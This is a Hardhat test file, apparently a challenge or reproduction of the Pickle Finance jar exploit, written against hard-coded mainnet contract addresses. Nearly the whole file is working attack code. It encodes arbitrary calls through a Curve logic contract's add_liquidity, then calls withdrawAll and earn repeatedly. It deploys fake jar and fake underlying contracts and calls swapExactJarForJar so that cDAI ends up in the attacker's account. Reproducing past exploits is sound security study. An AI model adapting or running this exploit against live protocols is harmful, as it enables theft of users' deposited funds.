const { ethers } = require('hardhat');
const { expect } = require('chai');

const CONTROLLER = '0x6847259b2B3A4c17e7c43C54409810aF48bA5210';
const CURVE_LOGIC = '0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8';
const STRAT = '0xCd892a97951d46615484359355e3Ed88131f829D';

const DAI_ = '0x6B175474E89094C44Da98b954EedeAC495271d0F';
const CDAI = '0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643';
const PDAI = '0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87';

describe('[Challenge] Pickle', function () {
  let attacker;
  let DAI;
  let cDAI;
  let pDAI;
  let fakeUnderlying;

  before(async function () {
    DAI = await ethers.getContractAt('ERC20', DAI_);
    cDAI = await ethers.getContractAt('ERC20', CDAI);
    pDAI = await ethers.getContractAt('JarLike', PDAI);

    const fakeUnderlyingFactory = await ethers.getContractFactory('FakeUnderlying');
    fakeUnderlying = await fakeUnderlyingFactory.deploy(cDAI.address);
  });

  it('Exploit', async function () {
    [attacker] = await ethers.getSigners();

    const earns = 5;

    const targets = [earns + 2]; // address
    const datas = [earns + 2]; // bytes
    const curve = await ethers.getContractAt('CurveLogicLike', CURVE_LOGIC);
    for (let i = 0; i < earns + 2; i++) {
      targets[i] = curve.address;
    }

    const withdrawAllIntf = new ethers.utils.Interface(['function withdrawAll()']);
    const withdrawAllFunctionSelector = withdrawAllIntf.getSighash('withdrawAll()');
    datas[0] = arbitraryCall(STRAT, withdrawAllFunctionSelector, cDAI.address);

    const earnIntf = new ethers.utils.Interface(['function earn()']);
    const earnFunctionSelector = earnIntf.getSighash('earn()');
    for (let i = 0; i < earns; i++) {
      datas[i + 1] = arbitraryCall(pDAI.address, earnFunctionSelector, cDAI.address);
    }

    const withdrawIntf = new ethers.utils.Interface(['function withdraw(address)']);
    const withdrawFunctionSelector = withdrawIntf.getSighash('withdraw(address)');
    datas[earns + 1] = arbitraryCall(STRAT, withdrawFunctionSelector, fakeUnderlying.address);

    console.log(
      'Before exploiting, Attacker cDAI Balance',
      await formatToken(await cDAI.balanceOf(attacker.address), cDAI)
    );

    console.log('DAI balance on pDAI', await formatToken(await DAI.balanceOf(pDAI.address), DAI));

    const fakeJarFactory = await ethers.getContractFactory('FakeJar');
    const fakeJar = await fakeJarFactory.deploy(cDAI.address);
    const controller = await ethers.getContractAt('ControllerLike', CONTROLLER);
    await controller.swapExactJarForJar(fakeJar.address, fakeJar.address, 0, 0, targets, datas);
  });

  after(async function () {
    // Attacker has taken all tokens from the pool
    console.log(
      'After exploiting, Attacker cDAI Balance',
      await formatToken(await cDAI.balanceOf(attacker.address), cDAI)
    );
    expect(await cDAI.balanceOf(attacker.address)).to.greaterThan(0);
  });
});

function arbitraryCall(to, functionSelector, param) {
  // Curve.add_liquidity ref: https://etherscan.io/address/0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8#code#F28#L27
  const ABI = [
    'function add_liquidity(address curve, bytes4 curveFunctionSig, uint256 curvePoolSize, uint256 curveUnderlyingIndex, address underlying)',
  ];
  const iAbi = new ethers.utils.Interface(ABI);
  const data = iAbi.encodeFunctionData('add_liquidity', [to, functionSelector, 1, 0, param]);
  return data;
}

async function formatToken(amount, token) {
  const tokenSymbol = await token.symbol();
  const decimals = await token.decimals();
  return `${ethers.utils.formatUnits(amount, decimals)} ${tokenSymbol}`;
}
